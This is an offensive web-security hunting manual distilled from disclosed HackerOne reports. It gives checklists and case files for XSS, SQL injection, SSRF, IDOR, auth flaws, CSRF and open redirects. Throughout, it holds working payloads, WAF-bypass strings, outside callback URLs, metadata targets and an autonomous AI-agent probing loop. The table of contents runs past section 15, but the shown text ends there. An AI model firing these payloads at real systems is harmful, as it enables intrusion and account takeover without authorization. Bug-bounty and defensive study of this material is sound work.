# Ultimate Web Hack Guideline — Distilled from 14,759 HackerOne Reports (Final)

> Evidence-based hunting manual for humans + AI agents. Every claim below traces to a fetched report (ID cited) or a corpus-wide measurement.
>
> **Corpus construction (reproducible):** all 14,759 links in `all-links.txt` (from `data.csv`) fetched in 30 batches of 500 via the HackerOne JSON API (`/reports/<id>.json`) — script `fetch_reports_json.py` (10-concurrent, 429-backoff, resume-safe). HTML scraping was rejected: HackerOne HTML returns only a `JavaScript is disabled` shell, while `.json` returns `title`, `weakness`, `severity`, `bounty`, full researcher `vulnerability_information` (payloads, PoCs, steps) and team/researcher `summaries`.
>
> **Yield:** 12,059 reports with readable JSON on disk (`report_data/json/`, mirrored readable in `report_data/md/`); **2,698 undisclosed/gone (HTTP 404) logged in `report_data/undisclosed.txt` and ignored**; ~3,000 fetched-but-empty/redacted bodies ignored as undisclosed-like; **9,057 usable bodies (≥200 chars)** analyzed by `analyze_corpus.py` → `report_data/analysis_summary.json` (+ `pertype_dump.txt`, `waf_dump.txt`). 45 reports mention WAF *and* bypass; 60 carry direct WAF context.
>
> **How to verify anything here:** open `report_data/md/<id>.md` (full researcher text) or `report_data/json/<id>.json` (raw). Start with `3723458` (regex→ATO), `2509022` (CSRF→XSS→GraphQL chain), `1040786` ($10k JWT chain), `1012249` (newline-scheme WAF bypass).

---

## Table of Contents

1. [How to use this file](#1-how-to-use-this-file-human--ai)
2. [Dataset snapshot — where the money and volume are](#2-dataset-snapshot--where-the-money-and-volume-are)
3. [The ten laws (everything else is commentary)](#3-the-ten-laws-everything-else-is-commentary)
4. [XSS — Reflected](#4-xss--reflected-372-usable-avg-87)
5. [XSS — Stored and blind](#5-xss--stored-and-blind-338-usable-avg-508)
6. [XSS — SVG, markdown, renderers, file viewers](#6-xss--svg-markdown-renderers-file-viewers-552-generic-avg-211)
7. [XSS — DOM and postMessage](#7-xss--dom-and-postmessage-85-usable-avg-163)
8. [SQL injection](#8-sql-injection-139-usable-avg-100)
9. [SSRF](#9-ssrf-153-usable-avg-451)
10. [IDOR / object-level authorization](#10-idor--object-level-authorization-158-usable-avg-538)
11. [Broken access control and privilege escalation](#11-broken-access-control-and-privilege-escalation-462--256-usable-avg-250)
12. [Broken authentication — OTP, 2FA, passwords, sessions](#12-broken-authentication--otp-2fa-passwords-sessions-471-usable-avg-226)
13. [CSRF — the chain starter](#13-csrf--the-chain-starter-307-usable-avg-112)
14. [Open redirect — the ATO springboard](#14-open-redirect--the-ato-springboard-200-usable-avg-109)
15. [Information disclosure](#15-information-disclosure-849-usable-avg-206)
16. [Business logic, race conditions, rate limits](#16-business-logic-race-conditions-rate-limits-253-usable-avg-234)
17. [OS command, SSTI/template, XXE, deserialization, CSV/formula injection](#17-os-command-sstitemplate-xxe-deserialization-csvformula-injection)
18. [Path traversal, file read, file upload](#18-path-traversal-file-read-file-upload-185-usable-avg-600)
19. [JWT, OAuth, SSO, session-token logic](#19-jwt-oauth-sso-session-token-logic)
20. [Cache poisoning/deception, smuggling, CRLF/header injection, clickjacking](#20-cache-poisoningdeception-smuggling-crlfheader-injection-clickjacking)
21. [DoS, ReDoS, resource consumption](#21-dos-redos-resource-consumption-403-usable-avg-572)
22. [Supply chain — dependency confusion, registries, install scripts](#22-supply-chain--dependency-confusion-registries-install-scripts)
23. [Client-side RCE surface — Electron, deep links, rich previews](#23-client-side-rce-surface--electron-deep-links-rich-previews)
24. [Misconfiguration and secure-design failures — origin IP, CORS, GraphQL, prototype pollution](#24-misconfiguration-and-secure-design-failures)
25. [Payload and WAF/filter-bypass playbook](#25-payload-and-waffilter-bypass-playbook)
26. [WAF-bypass methodology that actually worked](#26-waf-bypass-methodology-that-actually-worked)
27. [AI-agent automation pack](#27-ai-agent-automation-pack)
28. [Report template](#28-report-template-write-it-like-the-paid-reports)
29. [Appendix — reproduce, limits, ethics](#29-appendix--reproduce-limits-ethics)

---

## 1. How to use this file (human + AI)

**Human — the 2-hour loop.** Pick ONE section per session, in this order if unsure where to start: IDOR (§10) → Open redirect (§14) → Stored XSS (§5) → SSRF (§9) → Auth/OTP (§12). Run only that section's checklist. For every sink, climb the §25 ladder one rung at a time (plain → case-mix → whitespace/comment → encoding → alternate handler → alternate context/host). If blocked, do §26 (leave the WAF: alternate host, origin IP, method swap) before concluding anything. Write up with §28, and always test one hop further — chains out-earned singletons 3–10× in this corpus.

**AI agent — the autonomous loop.** (1) Crawl and catalog every sink: URL params, headers (`Host`, `X-Forwarded-*`, `X-Original-URL`, `Referer`, `User-Agent`), file uploads *including `filename`*, webhook/integration URL fields, markdown/comment/AI-chat fields, OAuth `redirect_uri`/`callback_url`, GraphQL operations, JWT-bearing endpoints, email-change/confirm flows, OTP/code endpoints. (2) Fire the §27 probe battery typed by sink shape. (3) Score by corpus exploitability signals: unencoded reflection, sequential numeric IDs, no `429` after 20 OTP tries, attacker-controlled `Location`, metadata fetch, `__schema` on, `transfer_auth`/`key`-in-URL patterns. (4) Re-test each hit with exactly one bypass mutation before reporting — ~40% of paid XSS here needed ≥1. (5) Refuse undisclosed-shaped targets (404 shell, empty body, `can_view_report=false`).

---

## 2. Dataset snapshot — where the money and volume are

Usable reports by weakness (count | mean bounty | what it means). Means are dragged down by long tails of $50–$500 reports; the *ceiling* per class is in the case files.

| Weakness | n | avg $ | Read |
|---|---|---|---|
| Information Disclosure | 849 | 206 | volume game; attachment-ID, GraphQL, CORS |
| Violation of Secure Design | 572 | 51 | low solo — chain it |
| XSS-Generic (SVG/markdown/viewer) | 552 | 211 | renderer pivots |
| Improper Authentication-Generic | 471 | 226 | OTP/no-rate-limit most repeatable |
| Improper Access Control-Generic | 462 | 250 | IDs, roles, JWT, headers |
| Uncontrolled Resource Consumption | 403 | 572 | costly to prove, well paid |
| XSS-Reflected | 372 | 87 | cheapest to find *and* cheapest paid — use in chains |
| XSS-Stored | 338 | 508 | **best web $/effort**: filenames, comments, greetings |
| CSRF | 307 | 112 | chain starter, rarely the headline |
| Privilege Escalation | 256 | 248 | takeover, role tamper, symlink |
| Business Logic Errors | 253 | 234 | coupons, plans, OTP reuse, resend oracles |
| Memory Corruption-Generic | 228 | 665 | mostly native targets (curl, libs) — out of web scope |
| Code Injection | 208 | 582 | Electron, formulas, renderers, registries |
| Open Redirect | 200 | 109 | regex/TOCTOU bypass → OAuth/SSO ATO |
| Path Traversal | 185 | 600 | `..;`, encoding ladders on file APIs |
| Command Injection-Generic | 163 | 873 | **highest web mean**: ping/sleep oracles, CSV, lua |
| IDOR | 158 | 538 | **highest web ROI**: swap ID, drop auth |
| SSRF | 153 | 451 | webhook/integration URLs, `url=` params |
| SQL Injection | 139 | 100 | time-blind dominates; WAF forces header/encoding tricks |
| Cryptographic Issues-Generic | 131 | 108 | TLS, StartTLS-strip, BREACH-shape, weak randomness |
| UI Redressing (Clickjacking) | 93 | 62 | chain-only |
| XSS-DOM | 85 | 163 | `location.*`, `innerHTML`, `postMessage` |
| Improper Restriction of Auth Attempts | 65 | 84 | the rate-limit class |
| HTTP Request Smuggling | 47 | 585 | desync → creds, redirects, cache |
| OS Command Injection | 45 | 515 | shell metachars, Confluence-style EL |
| Deserialization of Untrusted Data | 32 | 376 | pickle, Marshal, Telerik, logging-handler |
| Improper Authorization | 33 | 568 | GraphQL-permission gaps, OAuth merge, Pages scope |

Corpus-wide regex census over the 9,057 bodies (why the checklists below are ordered the way they are): URL-fetch-shaped params 2,332; `id=<n>`/`/api/<obj>/<n>` 1,443; OTP/2FA/rate-limit words 1,236; file-upload/multipart/`filename` 1,209; redirect-bypass chars (`//evil`, `@`, `\`, `%09`) 1,004; CSRF token/form words 831; `on*=` handlers 660; `<script` 575; double/unicode/HTML-entity encoding tricks 556; SQL quote-breakers 536; cache/CDN words 402; `{{ }}`/`${}` template markers 333; OAuth words 305; `<img onerror` 305; race/concurrent words 243; `javascript:` 205; DOM sinks 201; GraphQL words 195; null bytes 176; header-injection markers 167; shell separators (`;id`, `` `id` ``, `$(id)`, `|id`) 158; smuggling markers 132; `<svg` 131; SSRF IP-literal tricks 111; SQL time functions 102; JWT words 71; prototype pollution 55; `postMessage` 52; cloud-metadata literals 48; XXE `<!ENTITY` 33.

Observed bounty ceiling (single web reports): **$11,500** dependency confusion (`1043385`, LY Corp) and **$9,000** (`1007014`, Uber); **$10,000** GitLab Workhorse JWT chain (`1040786`); **$3,000** WikiCloth lua RCE (`1401444`); **$1,680** Pages token theft (`1439552`); **$1,000** `srcset` filter bypass (`1021885`).

---

## 3. The ten laws (everything else is commentary)

1. **Census sinks before payloads.** Every paid report begins from an enumerated sink: `q/keyword/query`, greeting/bio/comment/company, `filename`, `redirect/next/return_to/callback_url/checkout_url`, `url/image_url/webhook`, `id/account_id/order_id`, OTP/code, `Host`/`X-Forwarded-Host`/`X-Original-URL`, GraphQL ops, OAuth endpoints, email-confirm links, AI-chat fields, file-preview renderers. No sink list, no hunting.
2. **Anchor your regexes — or lose accounts.** Two critical-plus findings here are unanchored/partial regexes: Khan Academy's `KA_DOMAIN_REGEX` had unescaped dots, so `xfarr-6fmjyrz2lq-uc-a-run.app` matched a Cloud-Run allow-pattern and stole cross-domain transfer tokens (`3723458`); Basecamp's Electron "internal domain" check `launchpad\.(?:dev|test)` matched `launchpad.dev.attacker.com` and auto-executed downloads (`1016966`). Test every allow-regex with: subdomain-prefix (`evil.allow.com`), suffix (`allow.evil.com`), dot-vs-char (`allowXevil`), case, port, trailing dot, IDN.
3. **Validation ≠ output: TOCTOU is a whole vuln class.** Digits validated `callback_url` hostname, *then* wrote it to the `Location` header where `%ff` became `?` — turning authority into query and gifting OAuth creds to `attacker.com` (`108113`). Always diff the *validated* value against the *emitted/consumed* value (redirect targets, header echoes, stored-then-rendered fields, parser A vs parser B as in `1040786`'s Workhorse-vs-Rails URL cleaning).
4. **Read the sanitizer, then feed it its blind spot.** data.gov stripped `<` (`FILTER_SANITIZE_STRING`), so `onmou<seover` became `onmouseover` *after* filtering — site-wide, 80+ endpoints, beating Kona WAF and Chrome Auditor together (`265528`). abritel hid `"` *after* its WAF, so `</sc"ript>` sailed through and re-joined to `</script>` in cache-poisoned output (`1760213`). Shopify's tag-cutter fell to a `<!-->` prefix (`415484`). First question at any filter: *what does it remove?* Second: *what does my input become after removal?*
5. **Pivot renderer, don't fight it.** Blocked HTML? Try SVG upload (`100565`), markdown image/link targets (`2509022`), Mermaid (`1103258`), `srcset`/`manifest`/`profile`/doctype-SYSTEM (`1021885`), `filename` (`1010466`), `Referer`/`User-Agent` (SQLi `1018621`), alternate HTTP method/host (`1850235`).
6. **Leave the WAF instead of fighting it.** Same app, unprotected origin: `secnews.wpengine.com` vs WAF'd main (`168165`); POST endpoint vs WAF'd GET (`1850235`); origin IP via Censys/certs vs Cloudflare (`1105673`, `1327443`, `1536299`, `360825`); verb-tunneled requests past GET/POST-inspecting proxies (`3231321`).
7. **Chain lows into criticals.** CSRF-set-greeting → markdown-XSS → GraphQL conversation hijack → attacker-subscribe ATO (`2509022`); service-worker + OAuth `state` bypass + unscoped Pages cookie → private-site access (`1439552`); exposed upload JWT + path confusion + `Geo-GL-Id: key-<n>` → push as anyone (`1040786`); login/logout CSRF + stored XSS + WAF bypass → 1-click ATO (`632017`).
8. **Numbers that increment are guilty until proven innocent.** Sequential IDs, `key-<n>` SSH-key IDs, `customerregistration` numeric IDs (`1175980`), attachment IDs — swap across users, drop auth, change method, append `.json`/`/`, move ID query→body→header→JWT.
9. **Prefer time/differential oracles over errors.** `sleep(20)`/`WAITFOR DELAY` via headers when errors hide (`1018621`, `1034625`); quote-less `int-sleep(t)` when quotes die (`1278928`); OTP `000000`/resend-timing when messages stay generic; ReDoS timing vs baseline (`1000567`).
10. **Ignore undisclosed-shaped responses.** 404 shells, `can_view_report=false`, empty bodies, `visibility≠full` → log and move on (2,698 here). Never spend bypass budget on them.

## 4. XSS — Reflected (372 usable, avg $87)

**Root cause.** Untrusted query/form/header value reflected into HTML/JS/attribute/URL context without context-aware encoding. Sinks that paid repeatedly: search `keyword/q/query`, `project/plot` params (`1736432`, `1736433`), 404-page URL echo, `<link rel=canonical href=<URL>>` (`227486`), pagination blocks (`265528`), error pages.

**Vulnerable logic.** `echo $_GET['x']` into templates; full-URL interpolation into attributes; blacklist `s/<script>//` instead of encoding; two stacked defenses that cancel out (sanitizer strips chars the WAF relies on — `265528`).

**Exploitation ladder.** (1) Map context in view-source (text / double-quoted attr / single-quoted attr / JS string / URL). (2) Minimal breakout: attr → `" onfocus=confirm(1) autofocus tabindex=1 x="`; JS → `-20a")});a=alert;a(1);//` (`1184644`); URL → `javascript:` (needs click) or `data:text/html`. (3) Bypass rungs in order: case-mix → newline-in-scheme → split-tag → exotic handler → quote-evasion → rejoin-abuse (all with corpus payloads in §25).

**Hunt checklist.** Fuzz every reflected param as GET *and* POST (`1850235` needed POST to an alternate host); test path-segment *and* query (`252908`: `%2522` worked in path, not query); inspect canonical/OG/meta tags and 404/error pages; try `onauxclick` (right-click, thin signatures — `1736432`); try `print`` `` ` over `alert()` (ASP.NET WAF family `3166579`+); try unicode quotes `%u0022` (`227486`); try header points (`Referer`, `User-Agent`) when params are clean.

**Case files.** `1012249`: `<a+href="ja%0A%0Dvascript:alert(document.domain)">Click</a>` — newline-in-scheme, explicitly noted as the WAF bypass. `1251868`: `o<br>nfocus=confirm(1337) autofocus tabindex=1 xss` — tag-stripper split the handler name, `<br>` re-glued it. `265528` (data.gov): `&zzz%27onmou%3Cseover=1&ale%3Crt(%27xsp%27%3C)%3C;1;%20//` — stripped `<` rejoined `onmouseover`/`alert(xsp)`; site-wide 80+ endpoints; beat Kona WAF + Chrome Auditor at once. `1736432`/`1736433`: `aaa<h1 onauxclick=confirm(document.domain)>RIGHT CLICK HERE`. `1873655`: `0xd3adc0de<ScRiPt>alert('XSS Success!')</sCripT>` then HTML- then URL-encode the whole thing. `629745` (Starbucks 404s): WAF bounced any `"` URL to an error page; double-encoding (`%2522`, whitespace too) walked past. `3241321`: WAF cut `<`/`>` but left quotes → `X" onmouseover="alert('XSS')" style="font-size:1001pt;"`.

## 5. XSS — Stored and blind (338 usable, avg $508)

**Root cause.** Attacker input persisted (DB, file, cache) and rendered for *someone else* without encode-on-read: comments, `company`/profile fields firing in admin views, upload `filename`s, repo file viewers, chat greetings, poisoned cache entries.

**Why it pays 6× reflected.** Victim is an admin/support agent/other tenant; impact is session theft, GraphQL mutations, and ATO — not a self-pop. Blind variants (`1011888`: `"><script src=https://monty.xss.ht></script>` in a registration `company` field) fire where scanners never look.

**Bug patterns.** (a) `filename`-stored: support-chat upload with filename `\"><img src=1 onerror="url=String['fromCharCode'](104,116,…)` — fromCharCode hides the exfil URL from filters (`1010466`, chained with a CSRF on the upload endpoint itself). (b) Greeting/markdown-stored: CSRF plants `greeting=![…](javascript:eval(atob('…')))`; victim opens chat, wheel-clicks, attacker's base64 runs `fetch` of `window.__remixContext…userInfo` plus GraphQL `subscriberCreate` adding `saltymermaid@wearehackerone.com` to the victim's support thread (`2509022`). (c) Cache-stored: `hav`-cookie value poisoned the cache; WAF blocked `</script` but the app hid `"`, so `</sc"ript>` passed the WAF and rendered as `</script>` for everyone (`1760213`). (d) Tag-soup: WAF 500s on `<script`/`on*=` fell to `</li></ul>…<test/on…>` unclosed-tag soup (`218226`). (e) Comment-prefix: `<!-->` before tags slipped a tag-cutting WAF (`415484`, Shopify settings `street` field).

**Hunt checklist.** Persist payloads in *every* stored field (display name, bio, company, address, comments, tickets, filenames, avatars); use blind callbacks (xss.ht/Collaborator) for admin-only renders; test each stored value in a second account, incognito, and (where legitimate) admin/triage views; test cache keys for unkeyed inputs (cookies, `X-Forwarded-*`, `utm_*`); test CSP escape routes — `javascript:`-link + click, whitelisted-script gadgets, `String.fromCharCode` exfil.

## 6. XSS — SVG, markdown, renderers, file viewers (552 generic, avg $211)

**Root cause.** The *renderer* is the bug: SVG served inline, markdown image/link targets unsanitized, file viewers/converters (Mermaid, repo viewer) passing scripts/events through, email HTML rewriters with allowlist gaps.

**Case files.** SVG-inline (`100565`): upload `<svg xmlns=… onload="alert('script')"><script><![CDATA[…]]></script><circle …>`; win = served inline without `Content-Disposition: attachment` and without `Content-Security-Policy: default-src 'none'` (GitHub's mitigation — check response headers first). Markdown-greeting (`2509022` as above; also `100931`: link URL `javascript://%0a%0dalert(document.cookie)`). DOMPurify mXSS (`1024734`): `<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert('XSS') src>">` — nested MathML/SVG mutation confuses the sanitizer's DOM walk; test your target's DOMPurify version against publishsed mXSS batteries (this one felled default-config 2.2.0). Mermaid (`1103258`): chart `click`-handlers executed despite CSP attempts — audit every diagram/graph renderer for scriptable callbacks. Email-HTML (`1021885`, Hey, $1,000): rewriter proxied `img[src]` to `gopher.hey.com` but left `srcset` (`<img srcset="https://evil/log?img-srcset">`, even `,,,,,`-padded), plus `DOCTYPE SYSTEM`, `manifest`, `head profile` external-resource attributes — lesson: enumerate *every* URL-capable attribute (`srcset`, `poster`, `background`, `cite`, `longdesc`, `manifest`, `profile`, `lowsrc`), not just `src`/`href`.

**Hunt checklist.** Upload SVG + check `Content-Type`/`Content-Disposition`/CSP triple; markdown fields → `javascript:`/`data:text/html`/`//evil`/newline-scheme link targets; Mermaid/Graphviz/Math fields → mXSS + `click` handlers; email/ticket HTML → attribute census; file viewers → stored-HTML-as-preview.

## 7. XSS — DOM and postMessage (85 usable, avg $163)

**Root cause.** Client-side sinks: `location.search/hash`, `document.referrer`, `innerHTML/outerHTML/document.write`, `location.replace(search)`, `postMessage` without `event.origin` checks. Corpus: 201 DOM-sink hits, 52 `postMessage` hits.

**Case files.** `1004833`: `strSearch=location.search.substring(1); location.replace(strSearch)` → `?javascript:alert(1)` and `?evil.com` gave DOM-XSS *and* open redirect from one line. `1010132` (hey.com): reflected-in-DOM param behind CSP — reporter correctly flagged host-whitelist CSP bypass as the remaining step (always finish that step: JSONP endpoints, whitelisted JS libs with gadgets, `javascript:`-able frames). `2921905` (Doppler/Cloudflare): incomplete Unicode handling in JS turned `"<script>`-ish input into DOM-XSS — fuzz Unicode/overlong/%u forms at every JS sink.

**Hunt checklist.** Grep bundles for `location.hash|location.search|document.referrer|innerHTML|outerHTML|document.write|eval\(|setTimeout\(\s*["']|postMessage|addEventListener\(['"]message`; fuzz hash/search with `\"><img…>`, `javascript:`, `data:` while watching the DOM (not the network); postMessage: send objects/strings from attacker origin, drop/forge `origin`, try `__proto__` keys too (§24); where inline dies on CSP, pivot to link-click + gadget scripts.

## 8. SQL injection (139 usable, avg $100)

**Root cause.** String-interpolated SQL — including `ORDER BY`/sort/dir/page, search, and *header* values logged through SQL (`Referer`, `User-Agent`, `X-Forwarded-For`). Time-blind dominates because errors are hidden and WAFs eat quotes.

**Case files.** `1018621`: `Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'` against `Chart01.php?alert=` — header-point time-blind with `time curl` true/false calibration, then `substr()`-loop exfil of DB name. `1034625` (tsftp, Informatica): `WAITFOR DELAY` MSSQL blind; stopped at PoC (correct — don't dump). `577612`: MSSQL via `Customwho` with WAF bypass + `@@LANGID` fingerprinting. `1278928`: quote-less `int-sleep(t)` numeric construction "whatever the full query is" — built specifically for WAF/filters that eat quotes. `2633959`: injection in the URL *path*, not a param. `1217114` (CTF): `sleep`/`benchmark` WAF-blocked → pivot to *how* input executes (a `ping`-command path) for an alternate time oracle. `227102`: WAF fingerprinted by behavior — `200` valid, TCP-reset on `ORDER BY`, exceptions on malformed — then error-shape used as oracle. `214798`: sqlmap's own log shows the professional loop (WAF/IPS check → stability → dynamic-param test).

**Hunt checklist.** Hit every param *plus* sort/order/dir/page *plus* `Referer`/`User-Agent`/`X-Forwarded-For` with `'`, `"`, `\`, `sleep(5)`, `WAITFOR DELAY '0:0:5'`; calibrate true/false timing; fingerprint (`@@version`, `@@LANGID`, `version()`, `pg_sleep`); quotes blocked → quote-less numerics/path-segment/header points; only then sqlmap with tamper scripts; stop at boolean/time proof.

## 9. SSRF (153 usable, avg $451)

**Root cause.** Server fetches attacker URL — webhook/integration endpoints, `url/image_url/file` params, link-preview (`/api/v2/url_info?url=`), avatar/proxy, PDF/screenshot, feed readers, SAML metadata URLs — without allow-listing, and egress reaches cloud metadata.

**Case files.** `1055823` (Helium): custom HTTP integration endpoint set to `http://169.254.169.254/latest/meta-data/ami-id`; server copied the response body into integration messages — metadata-to-attacker-read primitive in one step. `1057531` (Tumblr): `GET /api/v2/url_info?url={{}}` Mustache-rendered fetch — template-in-URL is an SSRF smell. `1004847`: `xmlrpc.php` *method* not covered by the endpoint disable — test every method, not the documented one. `1049624`: curl long-schema URL-parser bug beat whitelist checks (library-level bypass class). `878779` (Grafana `/avatar/`): unauthenticated full-read SSRF → RCE path; fix was segregation + WAF — note the remediation shape. `1065493` (CTF Grinch): blacklist checked the *first* DNS resolution, action used the *second* — DNS-rebind/double-resolve TOCTOU; localhost-check bypass via hostname-that-resolves-later.

**Hunt checklist.** List every URL-fetcher; blind first (Collaborator/interactsh + DNS); then metadata (`169.254.169.254`, `metadata.google.internal`, `100.100.100.200`, `instance-data`); whitelist ladder — `0.0.0.0`, `127.1`, `2130706433`, `0x7f.1`, `%c0%ae`, `%252e`, `whitelist%09evil`, `evil@whitelist`, `user@evil` confusion, overlong schema, DNS 302-follow (server follows, filter doesn't), verb-tunnel (`3231321`); try `file:///etc/passwd` where `file:` survives; escalate to port-scan + creds → RCE narrative.

## 10. IDOR / object-level authorization (158 usable, avg $538)

**Root cause.** Object lookup by client-supplied ID with no ownership check; sometimes `user_id`/role trusted from body/JWT. Highest web ROI in the corpus — test first, always.

**Case files.** `1061292`: `pendingUserDetails/2634` + `getAttachmentBytes/600` — *unauthenticated*; fix was JWT-admin-only. `1005020`: `is_match:true` + exposed `user_id` let an unmatched profile initiate chat. `244636`: change `confirm_email` body to another email → verification link puts *that* account under attacker control (authorization decided by a client-side field). `2028450`: can't delete own message after leaving/kick — unless you call `DeleteMessage` directly (client-hides-action ≠ server-enforces). `1175980`: incremental customer IDs behind a public registration lookup → brute-forceable PII trawl. `1091380`: same object via alternate GraphQL query (`serviceMetrics.totalEarnings`) — object auth must live in the resolver, not the query.

**Hunt checklist (the IDOR liturgy).** Two accounts A/B; replay everything A owns as B, as nobody (drop auth), as wrong-role; sweep sequential IDs; method-swap (`GET/POST/PUT/DELETE/PATCH` + `_method` override); trailing `/`, `.json`, `?x=1`; move the ID query→body→header→JWT; confuse URL-ID vs body-ID; arrays (`ids:[…]`); GraphQL alternate queries/mutations for the same object; never stop at read — try write/delete/subscribe.

## 11. Broken access control and privilege escalation (462 + 256 usable, avg ~$250)

**Root cause.** Missing function-level checks, trusted client state, internal headers/paths honored from the outside, CORS over-permission, subdomain scope overreach.

**Case files.** `1004007`: `..;` bypassed Tomcat protections to unauthenticated example scripts. `1035742`: `/admin/` with no 403 — force-browse first, always. `1005374`: CORS `Access-Control-Allow-Origin: <evil>` + credentials on `wp-json` → SID-extraction PoC (`onclick=cors()` XHR). `1040786` ($10,000, GitLab): terraform-state upload API echoed the internal Workhorse JWT (`mirror.gitlab-workhorse-upload`); replay it as `Gitlab-Workhorse-Api-Request` + `Geo-GL-Id: key-<id>` (incremental SSH-key IDs, brute-forceable) + path-confusion `t%2f%2e%2e%2fgit-receive-pack` → push to repos as *any* key holder — three primitives (token leak + untrusted internal header + parser disagreement between Workhorse's URL cleaning and Rails) fused into unauthorized push. `1003007` (Acronis): backup-to-arbitrary-path + symlink → AntiRansomware file access. `1018790`: `register/promo/info.acronis.com` dangling → takeover → phishing/XSS/auth-bypass springboard + CA domain-validation note. `1439552` ($1,680, GitLab Pages): service worker on attacker's `*.gitlab.io` intercepts `/auth`; OAuth `state` CSRF protection bypassed by fetching the attacker's own redirect-URL+cookie and handing it to the victim; stolen `code`+`state` exchanged with the *original* session cookie — root flaw: Pages session cookie not bound to the issuing subdomain, so it worked across all victim-accessible private sites.

**Hunt checklist.** Force-browse (`/admin`, `/actuator`, `/console`, `/wp-json`, backups, examples) with `..;/`, `/%2e/`, case-mix; role-matrix every endpoint (anon/user/staff/admin, diff status *and* body); CORS triple-test (evil/null/subdomain origins); JWT `alg:none`/`kid`/role-claim; internal headers (`Geo-*`, `X-*-User`, `X-Original-URL`) from outside; dangling-CNAME sweep for takeover.

## 12. Broken authentication — OTP, 2FA, passwords, sessions (471 usable, avg $226)

**Root cause (most repeatable in the corpus).** No rate limit on short numeric codes + verify/resend oracles. 105/471 bodies mention OTP flows; `000000`, resend-resets-counter, and response-discrepancy recur.

**Case files and patterns.** OTP: request code → 20 rapid tries, no `429` → automate (4–6 digits; `000000` first); resend-loop (counter reset?), parallel-verify race, code reuse across sessions, IP rotation via `X-Forwarded-For` (`887700` used exactly this for dirsearch/WAF evasion — same trick defeats IP-based OTP limits), `invalid` vs `expired` message oracle. `1060518`: no rate limit on OTP-send → victim inbox bombing (abuse-of-function counts). `101977` (Imgur): own-Facebook-app token accepted at `generatetoken/thirdpartynativeandroid` — cross-app token confusion. `1018489` (Shopify): attacker-injected `<a href="/accounts/{victim_id}/external-login/1">` bound attacker's Google to victim flow. `1031613`: dark-theme chat overlay tricked users into typing 2FA codes into attacker-visible fields (UI-level 2FA theft — test overlay/scrolljacking on code dialogs). Passwords: user-enumeration via message/timing, no lockout, session surviving logout/password-change; admin paths without 403 (`1035742`); Workhorse-clean-vs-Rails-check gap (`1040786`).

**Hunt checklist.** OTP matrix (brute/resend/parallel/reuse/rotate/oracle); password-reset token entropy + expiry + single-use + host-poisoning (`Host`/`X-Forwarded-Host` on reset links); session invalidation on logout/password change; concurrent-session behavior; OAuth `access_token` cross-app replay.

## 13. CSRF — the chain starter (307 usable, avg $112)

**Root cause.** State-changing requests without unpredictable, action-bound tokens; `Origin` unchecked (Firefox/IE don't always send it — `103787`); `SameSite=Lax` + GET side effects + `_method` overrides.

**High-value targets from the corpus.** `1010466`: `support.cs.money/upload_file` had *no* token/origin check → CSRF planted the XSS `filename` (CSRF *set up* stored XSS). `2509022`: CSRF POST to `/en/search` planted the AI `greeting` that became XSS. `101145`: GET-based Gravatar image removal. `100849` (niche.co): empty `authenticity_token` + `_method=patch` — method-override CSRF. `1003468` (Weblate): logout CSRF (counts in chains). `632017`: stored XSS + WAF bypass + login/logout CSRF → 1-click ATO. `103787`: tokens not bound per action + `PATCH/DELETE` via `_method` + SOP-bypass/UXSS as CSRF amplifier.

**Hunt checklist.** Every state change: drop token → mismatch `Origin` → GET-ify POST → `_method` override → `Content-Type` downgrade (`text/plain`); login/logout CSRF always noted for chains; `SameSite` audit (`None` without `Secure` = bug; `Lax` + top-level GET side effect = bug); deliverability PoC (auto-submit form, `history.pushState` masking per `1010806`).

## 14. Open redirect — the ATO springboard (200 usable, avg $109)

**Root cause.** `redirect/next/return_to/callback_url/checkout_url` validated by blocklist/regex/parser-A but consumed by parser-B; validation→use TOCTOU; fragments/ports/case/IDN ignored.

**Case files.** `3723458` (Khan Academy, critical): `KA_DOMAIN_REGEX = /(^|\.)(khanacademy\.(org|dev|test|local)|kastatic\.org|.*-6fmjyrz2lq-uc.a.run.app)$/` — unescaped dots, source found via leaked sourcemap (`khanacademy.<hash>.js.map` → `libs/urls/src/regexp.ts`); attacker registered `xfarr-6fmjyrz2lq-uc-a-run.app`; `login?continue=<evil>` triggered `maybeAddAuthTransfer()` → one-time transfer token to attacker URL (`/transfer_auth?key=<TOKEN>`) — token unconsumed (victim JS never runs on evil domain) → replay on any `*.khanacademy.org` → full cookies (`KAAS/KAAL/KAAC`) as victim (students incl. minors — COPPA/FERPA blast radius). Fix: escape the dots; stop shipping sourcemaps. `108113` (Digits/Twitter): `callback_url=https://attacker.com%ff@www.periscope.tv` passed hostname validation, then `%ff`→`?` in the emitted `Location` header flipped authority into query → OAuth creds to attacker → account takeover on every Digits-integrated app. `1047447`: `sanitize_string` regex + `#fragment` (`http://google.com#sub.tkte.ch/`) confusion. `103772`: `checkout_url=.np` dot-prefix rode an authenticated login redirect off-domain. `104087` (Slack): SVG `onload="window.location=…"` as redirect primitive where uploads allowed.

**Hunt checklist.** `//evil`, `https:evil`, `\/evil`, `\\evil`, `%5c`, `whitelist.evil`, `evil#whitelist`, `javascript:`/`data:` schemes, `%09`/`%0d` prefixes, non-ASCII (`%ff`, IDN), `?next=` + parameter pollution, port/case/trailing-dot variants; OAuth/SSO params first (they decide ATO); always chain (redirect → `code`/token leak → XSS → login-CSRF landing).

## 15. Information disclosure (849 usable, avg $206)

**Root cause.** Over-exposed APIs/attachments/exports/websockets; missing object auth on read paths; rewriters/proxies with gaps; edge-vs-origin auth drift.

**Case files.** `1061292`: `pendingUserDetails/2634` + `getAttachmentBytes/<id>` unauthenticated. `1007988`: someone else's Drive-linked messages viewable/commentable. `1023669`: staff-without-permissions listening to customer conversions on `wss://argus.shopifycloud.com/graphql?shop_id={id}` (subscribe-shape overexposure). `1021885` ($1,000): `srcset`/`manifest`/`profile` bypass of Hey's tracker-proxy. `1023572`: aura endpoint honored swapped `Host` (`acronis.secure.force.com`) + retargeted path. `703882` and friends: Cloudflare-fronted origin found via cert/Censys → direct-IP reads without edge auth/WAF. `1010858`: cache-poisoning writeup doubling as disclosure primitive. `111752`: BREACH-shape alert (`/signin/` + HTTP compression + reflected input + reflected secret) with the full mitigation set (CSRF-protect the page, randomize/length-hide, rate-limit).

**Hunt checklist.** Auth-drop replay on every JSON/attachment/export/websocket endpoint; sequential-ID sweep; GraphQL introspection + alternate-query-per-object + staff-vs-anon diff; rewriter attribute census; `Host`/`X-Forwarded-Host` swaps; verbosity dials (`?debug=1`, bad IDs, `\u0000` error-bait per `1000567`); origin-IP hunt (§26) — origins routinely lack the edge's auth.

